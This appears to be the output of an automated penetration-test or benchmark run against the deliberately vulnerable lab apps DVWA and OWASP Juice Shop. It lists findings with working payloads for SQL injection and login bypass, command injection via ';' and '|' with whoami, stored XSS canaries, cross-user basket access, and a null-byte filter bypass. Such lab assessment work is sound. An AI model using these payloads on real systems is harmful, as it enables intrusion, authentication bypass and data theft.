findings.title: SQL Injection in DVWA SQLi page via unsanitized 'id' GET parameter [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 rows disclosing all seeded users' first/last names: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE payload id=1' AND '1'='2 returned zero records (page shows only the empty 'User ID:' prompt with no ID/First name/Surname rows). This confirms the boolean-based SQLi condition directly controls the number of returned rows, proving unsanitized string concatenation of the id parameter into the backend SQL query.

findings.title: OS Command Injection in DVWA Command Injection page via unsanitized 'ip' POST parameter [security=low]
findings.response_evidence: [security=low] Response pre-block included the expected ping output for 127.0.0.1 (4 packets transmitted, 0% packet loss) followed immediately by an extra line containing 'www-data' — the identity of the web server process — appended as a result of the injected ';' shell metacharacter executing the chained 'whoami' command. This confirms unsanitized shell command injection via the 'ip' parameter.

findings.title: Stored XSS in DVWA Guestbook via unsanitized 'mtxMessage' field [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id="test_token">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)
findings.response_evidence: [security=low] After posting the canary payload, the guestbook page's raw HTML/visible_text confirmed a new entry 'Name: tester' was stored unescaped (message rendered empty in visible_text because it was interpreted as a script tag rather than literal text, unlike the escaped seeded entry 'This is a test comment.'). Loading the page in an authenticated Playwright browser session and evaluating window.xss_flag returned 1, and browser_read_dom('#test_token') found the injected element with inner_text 'window.xss_flag=1', proving the injected <script> tag was stored and executed by the browser (client-side proof of stored XSS).
findings.browser_js_evidence: window.xss_flag === 1 (confirmed via browser_eval_js); DOM element #test_token present with inner_html 'window.xss_flag=1'

findings.title: SQL Injection via numeric boolean payload in POST id field (medium security)
request_sequence: POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} [security=medium]
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} [security=medium]
findings.response_evidence: [security=medium] Confirmed via session_info security_level=medium footer text 'Security Level: medium' on response pages. TRUE payload (id=1 OR 1=1) returned 5 seeded user records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload (id=1 AND 1=2) returned the form with the dropdown select but ZERO data rows (no 'First name:'/'Surname:' lines present in visible_text) -- only the User ID selector and More Information links. This differential TRUE(5 rows)/FALSE(0 rows) behavior confirms the id POST parameter is concatenated unsanitized into the backend SQL query numerically (no quote-escaping defense applies since no quotes were used), bypassing the medium-level input handling despite the UI changing id from a GET querystring param to a POST-submitted select dropdown.

findings.title: OS Command Injection via pipe character bypassing ';' and '&&' blacklist (medium security)
request_sequence: POST http://dvwa/vulnerabilities/exec/ with form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'} [security=medium]
findings.response_evidence: [security=medium] Confirmed via session_info/footer text 'Security Level: medium'. Payload ip='127.0.0.1| whoami' (pipe with leading space, no ';' or '&&' characters used) was submitted to POST /vulnerabilities/exec/. Response pre_blocks returned exactly: ['www-data']. The visible_text also shows 'Ping a device Enter an IP address: www-data' immediately following the form, confirming the shell executed the injected 'whoami' command via the pipe operator and returned the web server process identity 'www-data', proving the medium-level blacklist (which strips literal ';' and '&&' substrings) does not filter the pipe character and is bypassable.

findings.title: Stored XSS via unsanitized mtxMessage field executes script canary (medium security)
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ with form_data={txtName:'tester', mtxMessage:'<script id="test_token">window.xss_flag=1</script>', btnSign:'Sign Guestbook'} [security=medium]
findings.response_evidence: [security=medium] Confirmed via footer text 'Security Level: medium' on the POST response page and server page prior to browser navigation. The stored guestbook entry rendered as 'Name: tester Message: window.xss_flag=1' in the page's extracted text -- this text corresponds to the textContent of an UNESCAPED, UNSTRIPPED <script id=\"test_token\">window.xss_flag=1</script> element (script tag contents are included in textContent extraction even though the script does not visually render, which is why the raw JS source appeared as 'visible text' rather than being HTML-entity-encoded like '<script>'). A companion benign sanity test (payload '<script>alert(1)</script>') similarly rendered as 'Message: alert(1)' in the same manner, confirming the mtxMessage field is NOT subject to strip_tags()/htmlspecialchars() filtering at medium level (only txtName appears filtered per the earlier separate test where '<script>t' in txtName was stripped to bare 't'). This proves mtxMessage remains fully vulnerable to stored script injection at medium security.
findings.browser_js_evidence: browser_eval_js("typeof window.xss_flag !== 'undefined' ? window.xss_flag : 'undefined'") returned result: 1 (numeric), confirming the injected <script id="test_token">window.xss_flag=1</script> tag was served unescaped by the server and EXECUTED by the browser upon page load, setting window.xss_flag = 1. This is direct behavioral proof of stored XSS execution at DVWA security_level=medium.

findings.title: Broken Object Level Authorization (BOLA) on /rest/basket/{id} allows cross-user basket access
request_sequence: GET http://juiceshop:3000/rest/basket/6  (session=juiceshop_acct1, Bearer token for acct1_bench@juiceshop.local, own_basket_id=6) -> 200, returns basket id=6, UserId=22, Products=[Apple Juice (1000ml), BasketItem.quantity=3]

GET http://juiceshop:3000/rest/basket/6  (session=juiceshop_acct2, Bearer token for acct2_bench@juiceshop.local, own_basket_id=7, i.e. NOT basket 6) -> 200, returns IDENTICAL basket id=6, UserId=22, Products=[Apple Juice (1000ml), BasketItem.quantity=3]
findings.response_evidence: acct1's own basket (id=6, UserId=22) contains Apple Juice (1000ml) qty 3. When authenticated as acct2 (whose own_basket_id is 7, a distinct UserId), a GET to /rest/basket/6 returns HTTP 200 with the exact same JSON payload: {"status":"success","data":{"id":6,"UserId":22,...,"Products":[{"name":"Apple Juice (1000ml)",...,"BasketItem":{"BasketId":6,"quantity":3,...}}]}}. The server performed no ownership check tying the requesting user's token/UserId to the requested BasketId, allowing acct2 to fully read acct1's basket contents (product name and quantity) cross-user. This confirms Broken Object Level Authorization / IDOR (CWE-639).

findings.title: Login Authentication Bypass via SQL Injection in email field
findings.response_evidence: HTTP 200 response body: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}} — the injected email payload bypassed authentication and returned a valid JWT auth token identifying the first seeded user admin@juice-sh.op (bid:1), confirming classic SQL injection auth bypass (the ' OR 1=1-- comment truncates the WHERE clause, matching the first row returned by the query regardless of password).

findings.title: Product Search SQL Injection (error-based and UNION-based)
findings.response_evidence: Request 1 (single quote) returned HTTP 500 with body: 'Error: SQLITE_ERROR: near \"'%'\": syntax error' — proving the q parameter is concatenated unsanitized into a raw SQL LIKE query. Request 2 (9-column UNION SELECT closing the LIKE clause's parentheses) returned HTTP 200 with body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — demonstrating the attacker-controlled UNION SELECT successfully returned literal integer values 1-9 mapped directly onto the product object's columns, confirming exploitable UNION-based SQL injection.

findings.title: Unauthenticated Exposure of User Feedback Records Disclosing Author PII
findings.response_evidence: HTTP 200 returned without any authentication, exposing 8 feedback records each including a UserId linkage field and comment text embedding partially-masked author email addresses, e.g. record id:1 UserId:1 comment 'I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)', id:2 UserId:2 '(***@juice-sh.op)', id:3 UserId:3 '(***der@juice-sh.op)', id:4 UserId:21 comment including a crypto wallet seed phrase and '(***ereum@juice-sh.op)'. This confirms disclosure of PII (partial email addresses tied to numeric UserId records, plus sensitive wallet recovery phrase) to unauthenticated callers, violating access control expectations for feedback data (CWE-359).

findings.title: Poison Null-Byte Path Traversal / Extension-Filter Bypass on /ftp/ file server
findings.response_evidence:
Request 1 (raw .bak path): HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' and Express stack trace referencing fileServer.js verify() middleware, confirming the extension allowlist filter blocks direct .bak access.

Request 2 (null-byte bypass): GET /ftp/package.json.bak%2500.md returned HTTP 200, content_type application/octet-stream, with body being the actual content of package.json: '{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application", ... (full dependency list, devDependencies, repository url, etc.)'. This proves the extension filter (which only inspects the string suffix of the requested path) is bypassed by injecting a URL-encoded null byte (%2500, decoded server-side to %00) followed by an allowed extension (.md), while the underlying filesystem read truncates at the null byte and actually opens package.json.bak. This is the classic poison null byte path traversal / filter bypass (CWE-22).
